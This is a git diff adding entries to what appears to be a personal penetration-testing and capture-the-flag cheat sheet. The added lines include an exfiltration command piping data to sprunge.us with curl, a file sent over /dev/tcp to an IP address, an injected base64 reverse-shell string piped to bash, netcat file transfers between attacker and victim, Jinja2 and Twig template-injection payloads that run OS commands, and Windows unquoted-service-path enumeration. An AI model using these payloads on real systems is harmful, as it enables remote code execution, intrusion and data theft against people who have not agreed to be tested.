@@ -6,13 +6,16 @@
     $ chown `whoami` $HOME/.ssh/authorized_keys
 
 #trick
+	which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 	${IFS} instead of space in command
+	base64 exploit | curl -F 'sprunge=<-' http://sprunge.us
 	cat arc.tar > /dev/tcp/10.4.32.198/1234
 	"\";echo base64_reverse_shell | base64 -d | bash;\""
 	attacker: ncat -lvnp 80 < nmap
 	pwned:    cat > /tmp/nmap < /dev/tcp/<tunnel IP>/80
 	Tip on how to make a large (100mb) file: dd if=/dev/urandom of=bigfile.txt bs=1048576 count=100
-
+	du --apparent-size -ah // trick bypass commnad like ls,find
+	Tip: to input a line longer than 4095 characters on your terminal, run stty -icanon; nc imagestore.challs.teamitaly.eu 15000. 
 
 
 #stable shell in Linux
@@ -142,4 +145,37 @@
 	};
 	xhr.send();
 
+#SSTI
+	jinja2
+		{{lipsum.__globals__.os.popen('id').read()}}
+		{{ cycler.__init__.__globals__.os }}
+		{{ joiner.__init__.__globals__.os }}
+		{{ namespace.__init__.__globals__.os }}
 
+
+	Twig
+		{{app.request.query.filter('cmd',0,1024,{'options':'system'})}}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+WINDOWWWW
+
+#unquote path window privesc 
+	wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+#trick 
+	Get-ChildItem -PATH C:\Users\.. -Recurse
